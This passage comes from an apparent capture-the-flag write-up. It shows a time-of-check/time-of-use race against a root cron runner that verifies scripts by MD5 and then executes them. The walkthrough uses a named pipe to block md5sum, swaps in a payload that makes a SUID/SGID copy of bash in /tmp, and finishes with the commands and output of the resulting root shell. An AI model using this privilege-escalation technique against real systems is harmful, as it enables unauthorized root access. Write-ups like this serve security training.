## add other scripts below
# scripts[1]="<path-to-script>"
# sigs[1]="<md5sum>"

elems=${#scripts[@]}

for (( j=0; j<${elems}; j++ )) ; do
  sig=$(/usr/bin/md5sum ${scripts[$j]} | awk '{print $1}')
  if [[ "x$sig" == "x${sigs[$j]}" ]] ; then
    # echo "Script is safe. Running it." >> /var/log/secure-cron-runner.log
    ${scripts[$j]}
  else
    # echo "Script is not safe. Skipping it." >> /var/log/secure-cron-runner.log
    :
  fi
done
```

**Script Behavior:**

1. Loads environment variables from `/root/conf/secure-cron-runner.env`
2. Defines array of scripts to run with their expected MD5 hashes
3. For each script:
   * Calculates MD5 hash
   * Compares with expected hash
   * If match: executes script
   * If no match: skips script

**Vulnerability:** Time-of-Check Time-of-Use (TOCTOU)

There's a small time gap between when the MD5 hash is calculated and when the script is executed. If we can replace the script in this window, our malicious version will run!

#### Understanding TOCTOU Attack

**TOCTOU (Time-of-Check Time-of-Use):**

* Race condition vulnerability
* Exploits time gap between validation and use
* Common in file system operations

**Attack Strategy:**

1. Create script as named pipe (blocks md5sum read)
2. Wait for md5sum to start reading
3. Move pipe to different name
4. Place malicious script at original location
5. Feed legitimate content to pipe (md5sum completes with correct hash)
6. Malicious script executes!

#### Named Pipe Proof of Concept

Testing the concept:

```bash
max@race:/usr/local/share/race-scripts$ mkfifo test_pipe
max@race:/usr/local/share/race-scripts$ md5sum test_pipe
```

The command hangs waiting for input. In another terminal:

```bash
max@race:/usr/local/share/race-scripts$ echo "test data" > test_pipe
```

First terminal completes:

```bash
max@race:/usr/local/share/race-scripts$ md5sum test_pipe
eb733a00c0c9d336e65691a37ab54293  test_pipe
```

Verifying the hash matches:

```bash
max@race:/usr/local/share/race-scripts$ echo "test data" | md5sum
eb733a00c0c9d336e65691a37ab54293  -
```

Perfect! The pipe concept works.

#### Exploiting TOCTOU

**Remove Original Script**

The original script is owned by root, but max owns the directory:

```bash
max@race:/usr/local/share/race-scripts$ rm offsite-backup.sh
rm: remove write-protected regular file 'offsite-backup.sh'? y
max@race:/usr/local/share/race-scripts$ ls
backup
```

Script removed (directory write permission allows deletion)

**Create Named Pipe**

```bash
max@race:/usr/local/share/race-scripts$ mkfifo offsite-backup.sh
max@race:/usr/local/share/race-scripts$ ls -la offsite-backup.sh
prw-rw-r-- 1 max max 0 Aug 29 20:45 offsite-backup.sh
```

**Wait for Cron Execution**

Monitoring processes:

```bash
max@race:/usr/local/share/race-scripts$ watch -n 0.1 'ps auxww | grep md5sum'
```

At the next minute mark, we see:

```
root      270113  0.0  0.0   5784  1040 ?        S    20:48   0:00 /usr/bin/md5sum /usr/local/share/race-scripts/offsite-backup.sh
```

md5sum is now blocked reading from our pipe!

**Replace Pipe with Malicious Script**

Moving the pipe:

```bash
max@race:/usr/local/share/race-scripts$ mv offsite-backup.sh pipe
```

Creating malicious script:

```bash
max@race:/usr/local/share/race-scripts$ cat > offsite-backup.sh << 'EOF'
#!/bin/bash

cp /bin/bash /tmp/sn0x_bash
chmod 6777 /tmp/sn0x_bash
EOF

max@race:/usr/local/share/race-scripts$ chmod +x offsite-backup.sh
```

**Payload Explanation:**

* Copies `/bin/bash` to `/tmp/sn0x_bash`
* Sets SUID (4000) + SGID (2000) + full permissions (777)
* When executed as root, creates a root-owned SUID bash

**Feed Legitimate Content to Pipe**

```bash
max@race:/usr/local/share/race-scripts$ cat backup/offsite-backup.sh > pipe
```

This unblocks the md5sum command, which will:

1. Calculate hash of legitimate script (from pipe)
2. Hash matches expected value
3. Our malicious script gets executed!

**Verify SUID Bash**

```bash
max@race:/usr/local/share/race-scripts$ ls -la /tmp/sn0x_bash
-rwsrwsrwx 1 root root 1396520 Aug 29 20:51 /tmp/sn0x_bash
```

**SUID bash created successfully!**

**Permission Breakdown:**

* `rws`: Owner (root) - read, write, SUID
* `rws`: Group (root) - read, write, SGID
* `rwx`: Others - read, write, execute

#### Getting Root Shell

```bash
max@race:/usr/local/share/race-scripts$ /tmp/sn0x_bash -p
sn0x_bash-5.1# id
uid=1001(max) gid=1001(max) euid=0(root) egid=0(root) groups=0(root),1001(max),1002(racers)
sn0x_bash-5.1# whoami
root
```

**Root shell**

**Note:** The `-p` flag preserves the SUID privileges, giving us effective UID 0 (root).

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
